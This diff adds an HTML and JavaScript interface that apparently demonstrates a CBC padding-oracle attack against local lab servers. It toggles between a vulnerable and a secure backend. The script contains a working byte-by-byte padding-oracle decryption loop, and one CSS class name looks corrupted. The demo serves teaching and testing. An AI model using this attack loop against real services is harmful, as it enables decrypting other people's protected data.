@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CBC Oracle Interface</title>
+    <!-- Load Tailwind CSS from CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Import "Hacker" Font: Inconsolata -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inconsolata', monospace; }
+        #attackLog::-webkit-scrollbar { width: 8px; }
+        #attackLog::-webkit-scrollbar-track { background: #000; }
+        #attackLog::-webkit-scrollbar-thumb { background: #0891b2; border-radius: 4px; }
+        #attackLog::-webkit-scrollbar-thumb:hover { background: #0e7490; }
+
+        /* --- Toggle Switch Styles --- */
+        .toggle-checkbox:checked {
+            right: 0;
+            border-color: #0891b2; /* cyan-700 */
+        }
+        .toggle-checkbox:checked + .toggle-label {
+            background-color: #0891b2; /* cyan-700 */
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: { mono: ['Inconsolata', 'monospace'], },
+                    boxShadow: {
+                        'cyber-glow': '0 0 15px rgba(0, 255, 255, 0.3), 0 0 5px rgba(0, 255, 255, 0.2)',
+                        'cyber-glow-green': '0 0 15px rgba(74, 222, 128, 0.3), 0 0 5px rgba(74, 222, 128, 0.2)',
+                        'cyber-glow-red': '0 0 15px rgba(248, 113, 113, 0.3), 0 0 5px rgba(248, 113, 113, 0.2)',
+                        'cyber-glow-blue': '0 0 15px rgba(96, 165, 250, 0.3), 0 0 5px rgba(96, 165, 250, 0.2)',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-black text-cyan-400 antialiased font-mono">
+
+    <div class="container mx-auto p-4 md:p-8 max-w-7xl">
+        <header class="text-center mb-8">
+            <h1 class="text-4xl font-bold text-cyan-300 mb-2 shadow-cyber-glow">[ CBC ORACLE INTERFACE ]</h1>
+        </header>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+            
+            <!-- Left Panel: Configuration & Results -->
+            <div class="bg-gray-950 p-6 rounded-lg shadow-xl border border-cyan-500/30">
+                <h2 class="text-2xl font-semibold mb-6 text-cyan-300 border-b border-cyan-500/30 pb-2">1. Vector Config</h2>
+
+                <!-- Target Mode Toggle -->
+                <div class="mb-6">
+                    <label class="block text-sm font-medium text-cyan-200 mb-3">Target Mode:</label>
+                    <div class="flex items-center space-x-4">
+                        <span id="mode-label-vulnerable" class="text-red-400 font-bold">VULNERABLE</span>
+                        <div class="relative inline-block w-10 mr-2 align-middle select-none transition duration-200 ease-in">
+                            <input type="checkbox" name="modeToggle" id="modeToggle" class="toggle-checkbox absolute block w-6 h-6 rounded-full bg-black border-2 border-red-500 appearance-none cursor-pointer"/>
+                            <label for="modeToggle" class="toggle-label block overflow-hidden h-6 rounded-full bg-red-500/30 cursor-pointer"></label>
+                        </div>
+                        <span id="mode-label-secure" class="text-gray-600 font-bold">SECURE</span>
+                    </div>
+                </div>
+
+                <div class="mb-4">
+                    <label for="backendUrl" class="block text-sm font-medium text-cyan-200 mb-2">Target Host:</label>
+                    <input type="text" id="backendUrl" value="http://127.0.0.1:5000" disabled class="w-full bg-black border border-cyan-700/50 rounded-md px-3 py-2 text-red-400 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-cyan-500 focus:shadow-cyber-glow">
+                </div>
+
+                <!-- NEW: Plaintext Input -->
+                <div class="mb-4">
+                    <label for="plaintextInput" class="block text-sm font-medium text-cyan-200 mb-2">Plaintext to Encrypt:</label>
+                    <textarea id="plaintextInput" rows="3" class="w-full bg-black border border-cyan-700/50 rounded-md px-3 py-2 text-sm text-cyan-300 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-cyan-500 focus:shadow-cyber-glow" placeholder="Enter readable text... (e.g., 'secret')">This is the top secret message!</textarea>
+                </div>
+
+                <!-- NEW: Read-only Payload Output -->
+                <div class="mb-4">
+                    <label for="targetPayloadHex" class="block text-sm font-medium text-cyan-200 mb-2">Target Payload (Hex):</label>
+                    <textarea id="targetPayloadHex" rows="5" class="w-full bg-gray-900 border border-cyan-700/50 rounded-md px-3 py-2 text-sm text-cyan-600 focus:outline-none" placeholder="Payload will be generated here..." disabled></textarea>
+                </div>
+
+                <div class="grid grid-cols-3 gap-4 mb-8">
+                    <!-- NEW: "Encrypt & Load" Button -->
+                    <button id="generatePayloadButton" class="w-full bg-transparent border-2 border-blue-500 text-blue-400 font-bold py-2 px-4 rounded-md transition duration-300 ease-in-out hover:bg-blue-500/20 hover:shadow-cyber-glow-blue">
+                        Encrypt & Load
+                    </button>
+                    <button id="startButton" class="w-full bg-transparent border-2 border-green-500 text-green-400 font-bold py-2 px-4 rounded-md transition duration-300 ease-in-out hover:bg-green-500/20 hover:shadow-cyber-glow-green">
+                        Execute
+                    </button>
+                    <button id="resetButton" class="w-full bg-transparent border-2 border-red-500 text-red-400 font-bold py-2 px-4 rounded-md transition duration-300 ease-in-out hover:bg-red-500/20 hover:shadow-cyber-glow-red">
+                        Reset
+                    </button>
+                </div>
+
+                <h2 class="text-2xl font-semibold mb-6 text-cyan-300 border-b border-cyan-500/30 pb-2">2. Decrypted Data</h2>
+                <div id="statusMessage" class="status-message text-center font-semibold p-3 rounded-md mb-4 bg-gray-900 text-cyan-400 border border-cyan-700/50 animate-pulse">
+                    STATUS: STANDBY
+                </div>
+                
+                <div class="bg-black p-4 rounded-md border border-cyan-700/50">
+                    <h3 class="text-lg font-medium text-cyan-200 mb-2">DECRYPTED (ASCII):</h3>
+                    <div id="decryptedAscii" class="font-mono text-green-400 text-lg min-h-[50px] p-3 rounded break-words"></div>
+                </div>
+                <div class="bg-black p-4 rounded-md border border-cyan-700/50 mt-4">
+                    <h3 class="text-lg font-medium text-cyan-200 mb-2">DECRYPTED (HEX):</h3>
+                    <div id="decryptedHex" class="font-mono text-cyan-400 text-sm min-h-[50px] p-3 rounded break-words"></div>
+                </div>
+            </div>
+
+            <!-- Right Panel: Attack Log -->
+            <div class="bg-gray-950 p-6 rounded-lg shadow-xl border border-cyan-500/30">
+                <h2 class="text-2xl font-semibold mb-6 text-cyan-300 border-b border-cyan-500/30 pb-2">3. Live Process Log</h2>
+                <div id="attackLog" class="h-96 lg:h-[calc(100%-4rem)] bg-black rounded-md p-4 overflow-y-auto font-mono text-xs border border-cyan-700/50">
+                    <div class="text-gray-500">> STANDBY_</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- UI Elements ---
+        const backendUrlInput = document.getElementById('backendUrl');
+        const plaintextInput = document.getElementById('plaintextInput'); // New
+        const targetPayloadHex = document.getElementById('targetPayloadHex'); // Renamed
+        const generatePayloadButton = document.getElementById('generatePayloadButton'); // Renamed
+        const startButton = document.getElementById('startButton');
+        const resetButton = document.getElementById('resetButton');
+        const statusMessageDiv = document.getElementById('statusMessage');
+        const decryptedHexDiv = document.getElementById('decryptedHex');
+        const decryptedAsciiDiv = document.getElementById('decryptedAscii');
+        const attackLogDiv = document.getElementById('attackLog');
+        const modeToggle = document.getElementById('modeToggle');
+        const modeLabelVulnerable = document.getElementById('mode-label-vulnerable');
+        const modeLabelSecure = document.getElementById('mode-label-secure');
+        
+        const blockSize = 16;
+        let currentDecryptedBytes = [];
+        let isAttacking = false;
+
+        const hosts = {
+            vulnerable: {
+                url: "http://127.0.0.1:5000",
+                endpoint: "/decrypt-vulnerable",
+                fetch: "/encrypt" // This is now a POST endpoint
+            },
+            secure: {
+                url: "http://127.0.0.1:5001",
+                endpoint: "/decrypt-secure",
+                fetch: "/encrypt-secure" 
+            }
+        };
+
+        // --- Utility Functions ---
+        function hexToBytes(hex) {
+            if (hex.length % 2 !== 0) {
+                throw new Error("Hex string must have an even length.");
+            }
+            const bytes = new Uint8Array(hex.length / 2);
+            for (let i = 0; i < hex.length; i += 2) {
+                bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
+            }
+            return bytes;
+        }
+
+        function bytesToHex(bytes) {
+            return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        function logToScreen(message, type = 'info') {
+            const entry = document.createElement('div');
+            let colorClass = 'text-gray-500';
+            if (type === 'good') colorClass = 'text-green-500 font-bold';
+            if (type === 'bad') colorClass = 'text-red-500';
+            if (type === 'guess') colorClass = 'text-gray-600';
+            if (type === 'info') colorClass = 'text-yellow-300';
+            if (type === 'found') colorClass = 'text-cyan-300 font-bold';
+            
+            entry.className = colorClass;
+            entry.textContent = `> ${message}`;
+            attackLogDiv.appendChild(entry);
+            attackLogDiv.scrollTop = attackLogDiv.scrollHeight;
+        }
+
+        function updateStatus(message, type = 'info') {
+            statusMessageDiv.textContent = `STATUS: ${message.toUpperCase()}`;
+            statusMessageDiv.className = 'status-message text-center font-semibold p-3 rounded-md mb-4';
+            if (type === 'error') statusMessageDiv.classList.add('bg-red-900/50', 'text-red-400', 'border', 'border-red-700/50');
+            if (type === 'success') statusMessageDiv.classList.add('bg-green-900/50', 'text-green-400', 'border', 'border-green-700/50');
+            if (type === 'info') statusMessageDiv.classList.add('bg-blue-900/50', 'text-blue-400', 'border', 'border-blue-700/50', 'animate-pulse');
+            if (type === 'wait') statusMessageDiv.classList.add('bg-gray-900', 'text-cyan-400', 'border', 'border-cyan-700/50', 'animate-pulse');
+        }
+
+        function updateDecryptedText() {
+            const bytes = new Uint8Array(currentDecryptedBytes);
+            decryptedHexDiv.textContent = bytesToHex(bytes) || " ";
+            try {
+                const text = new TextDecoder('utf-8', { fatal: false })
+                                .decode(bytes)
+                                .replace(/[\x00-\x1F\x7F-\x9F]/g, '.');
+                decryptedAsciiDiv.textContent = text || " ";
+            } catch (e) {
+                decryptedAsciiDiv.textContent = "[DECODE_ERROR]";
+            }
+        }
+        
+        function resetUI() {
+            isAttacking = false;
+            setButtonsDisabled(false);
+            currentDecryptedBytes = [];
+            updateDecryptedText();
+            attackLogDiv.innerHTML = '<div class="text-gray-500">> STANDBY_</div>';
+            updateStatus("Standby", "wait");
+            // Clear the generated payload, but not the user's plaintext
+            targetPayloadHex.value = ""; 
+        }
+        
+        function setButtonsDisabled(disabled) {
+            startButton.disabled = disabled;
+            generatePayloadButton.disabled = disabled; 
+            plaintextInput.disabled = disabled;
+            targetPayloadHex.disabled = true; // Always read-only
+            modeToggle.disabled = disabled;
+            
+            [startButton, generatePayloadButton, resetButton].forEach(btn => {
+                btn.classList.toggle('opacity-30', disabled);
+                btn.classList.toggle('cursor-not-allowed', disabled);
+            });
+            resetButton.disabled = false;
+            resetButton.classList.remove('opacity-30', 'cursor-not-allowed');
+        }
+
+        // --- Core Attack Logic ---
+        
+        async function sendAttackRequest(payloadHex) {
+            const isSecureMode = modeToggle.checked;
+            const target = isSecureMode ? hosts.secure : hosts.vulnerable;
+            const url = target.url + target.endpoint;
+            
+            const payload = { ciphertext: payloadHex };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+                
+                if (response.ok) {
+                    return { status: 'GOOD', message: result.oracle_response || 'OK' };
+                } else {
+                    return { status: 'BAD', message: result.oracle_response || 'ERROR' };
+                }
+            } catch (error) {
+                console.error("Fetch error:", error);
+                updateStatus(`Connection Error: ${error.message}. Is host up?`, 'error');
+                throw new Error("Connection Error. Halting process.");
+            }
+        }
+
+        async function performAttack() {
+            if (isAttacking) return;
+            isAttacking = true;
+            
+            // Clear log and status, but don't reset payload
+            attackLogDiv.innerHTML = '';
+            updateStatus("Executing...", "info");
+            
+            isAttacking = true; 
+            setButtonsDisabled(true);
+            
+            const isSecureMode = modeToggle.checked;
+            
+            let fullCiphertextBytes;
+            try {
+                fullCiphertextBytes = hexToBytes(targetPayloadHex.value.trim());
+                if (fullCiphertextBytes.length === 0) throw new Error("No payload loaded. Encrypt plaintext first.");
+                if (fullCiphertextBytes.length % blockSize !== 0) throw new Error("Payload length not multiple of block size.");
+                if (fullCiphertextBytes.length < blockSize * 2) throw new Error("Payload must be at least 2 blocks (IV + C1).");
+            } catch (e) {
+                updateStatus(e.message, 'error');
+                setButtonsDisabled(false);
+                isAttacking = false;
+                return;
+            }
+            
+            const numBlocks = (fullCiphertextBytes.length / blockSize) - 1;
+            logToScreen(`--- INITIATING DECRYPTION [${numBlocks} BLOCKS] ---`, 'info');
+            logToScreen(`TARGET MODE: ${isSecureMode ? 'SECURE' : 'VULNERABLE'}`, 'info');
+            
+            try {
+                for (let blockIndex = 1; blockIndex <= numBlocks; blockIndex++) {
+                    const c_prev = fullCiphertextBytes.slice((blockIndex - 1) * blockSize, blockIndex * blockSize);
+                    const c_curr = fullCiphertextBytes.slice(blockIndex * blockSize, (blockIndex + 1) * blockSize);
+                    
+                    logToScreen(`\n[+] Targeting Block ${blockIndex} / ${numBlocks}...`, 'info');
+                    updateStatus(`Targeting Block ${blockIndex} / ${numBlocks}...`, 'info');
+                    
+                    const intermediateBytes = new Uint8Array(blockSize);
+                    const decryptedBlockBytes = new Uint8Array(blockSize);
+                    
+                    for (let padBytePos = 1; padBytePos <= blockSize; padBytePos++) {
+                        const targetByteIndex = blockSize - padBytePos;
+                        const c_prime = new Uint8Array(blockSize);
+                        
+                        for (let k = 1; k < padBytePos; k++) {
+                            const knownByteIndex = blockSize - k;
+                            c_prime[knownByteIndex] = intermediateBytes[knownByteIndex] ^ padBytePos;
+                        }
+
+                        let foundByte = false;
+                        for (let guess = 0; guess <= 255; guess++) {
+                            if (!isAttacking) {
+                                logToScreen("--- PROCESS HALTED BY USER ---", "error");
+                                throw new Error("Process halted by user.");
+                            }
+                            
+                            c_prime[targetByteIndex] = guess;
+                            const payloadHex = bytesToHex(c_prime) + bytesToHex(c_curr);
+                            const logMsg = `B:${blockIndex}, P:${blockSize - padBytePos + 1}, G:0x${guess.toString(16).padStart(2, '0')}...`;
+                            
+                            const result = await sendAttackRequest(payloadHex);
+
+                            if (result.status === 'GOOD') {
+                                logToScreen(logMsg + ` -> ${result.message}`, 'good');
+                                intermediateBytes[targetByteIndex] = guess ^ padBytePos;
+                                decryptedBlockBytes[targetByteIndex] = intermediateBytes[targetByteIndex] ^ c_prev[targetByteIndex];
+                                logToScreen(`  => BYTE FOUND: 0x${decryptedBlockBytes[targetByteIndex].toString(16).padStart(2, '0')}\n`, 'found');
+                                foundByte = true;
+                                break;
+                            } else {
+                                // This is 'BAD' or 'ERROR'
+                                if (guess % 32 === 0 || (isSecureMode && guess < 5)) logToScreen(logMsg + ` -> ${result.message}`, 'bad');
+                                if (isSecureMode) {
+                                    // In secure mode, we *never* find a 'GOOD' byte.
+                                    break; 
+                                }
+                            }
+                        } // end guess loop (0-255)
+
+                        if (!foundByte) {
+                            if (isSecureMode) {
+                                logToScreen(`! ATTACK BLOCKED. Server did not provide a padding oracle.`, 'error');
+                                throw new Error("Attack ineffective against secure target.");
+                            } else {
+                                // Handle the special 0x01 padding case for vulnerable mode
+                                logToScreen(`! No valid byte found (0-255). Assuming special case (I[n] = ${padBytePos}).`, 'info');
+                                intermediateBytes[targetByteIndex] = 0 ^ padBytePos; // G=0x00
+                                decryptedBlockBytes[targetByteIndex] = intermediateBytes[targetByteIndex] ^ c_prev[targetByteIndex];
+                                logToScreen(`  => BYTE FOUND (S-CASE): 0x${decryptedBlockBytes[targetByteIndex].toString(16).padStart(2, '0')}\n`, 'found');
+                            }
+                        }
+                    } // end byte loop (1-16)
+                    
+                    decryptedBlockBytes.forEach(byte => currentDecryptedBytes.push(byte));
+                    updateDecryptedText();
+                    
+                } // end block loop
+                
+                updateStatus("Process Complete", "success");
+                logToScreen("\n--- PROCESS COMPLETE ---", "success");
+
+            } catch (error) {
+                updateStatus(error.message, 'error');
+                logToScreen(error.message, 'error');
+            } finally {
+                isAttacking = false;
+                setButtonsDisabled(false);
+            }
+        }
+        
+        async function generatePayload() {
+            setButtonsDisabled(true);
+            updateStatus("Generating payload...", "info");
+            logToScreen("Contacting host to encrypt plaintext...", 'info');
+            try {
+                // We *always* fetch from the vulnerable server, as it's set up
+                // to give a simple IV+C* payload for the attack.
+                const url = hosts.vulnerable.url + hosts.vulnerable.fetch;
+                const plaintext = plaintextInput.value;
+                
+                const response = await fetch(url, {
+                    method: 'POST', // Changed to POST
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ plaintext: plaintext }) // Send user's plaintext
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Host responded with ${response.status}`);
+                }
+                const data = await response.json();
+                if (data.full_payload_for_attack) {
+                    targetPayloadHex.value = data.full_payload_for_attack; // Populate the hex box
+                    updateStatus("Payload Acquired. Ready.", "wait");
+                    logToScreen(`Plaintext encrypted: "${data.plaintext_encrypted}"`, 'info');
+                    logToScreen(`Payload acquired: ${data.full_payload_for_attack.substring(0, 40)}...`, 'found');
+                }
+            } catch (e) {
+                updateStatus(`Fetch Failed: ${e.message}. Is host up?`, 'error');
+                logToScreen(`Failed to contact host at ${hosts.vulnerable.url}`, 'error');
+            } finally {
+                setButtonsDisabled(false);
+            }
+        }
+        
+        // --- Event Listeners ---
+        startButton.addEventListener('click', performAttack);
+        resetButton.addEventListener('click', () => {
+            isAttacking = false; // This will stop the attack loop
+            resetUI();
+        });
+        generatePayloadButton.addEventListener('click', generatePayload); 
+
+        modeToggle.addEventListener('change', (e) => {
+            const isSecure = e.target.checked;
+            if (isSecure) {
+                backendUrlInput.value = hosts.secure.url;
+                backendUrlInput.classList.remove('text-red-400', 'border-red-500/50');
+                backendUrlInput.classList.add('text-green-400', 'border-cyan-700/5Example');
+                modeLabelVulnerable.classList.remove('text-red-400');
+                modeLabelVulnerable.classList.add('text-gray-600');
+                modeLabelSecure.classList.remove('text-gray-600');
+                modeLabelSecure.classList.add('text-cyan-400');
+                modeToggle.classList.remove('border-red-500');
+                modeToggle.classList.add('border-cyan-500');
+            } else {
+                backendUrlInput.value = hosts.vulnerable.url;
+                backendUrlInput.classList.add('text-red-400', 'border-red-500/50');
+                backendUrlInput.classList.remove('text-green-400', 'border-cyan-700/50');
+                modeLabelVulnerable.classList.add('text-red-400');
+                modeLabelVulnerable.classList.remove('text-gray-600');
+                modeLabelSecure.classList.add('text-gray-600');
+                modeLabelSecure.classList.remove('text-cyan-400');
+                modeToggle.classList.add('border-red-500');
+                modeToggle.classList.remove('border-cyan-500');
+            }
+        });
+
+        // Initial setup
+        resetUI();
+        // Automatically generate a payload on first load
+        generatePayload();
+    </script>
+</body>
+</html>
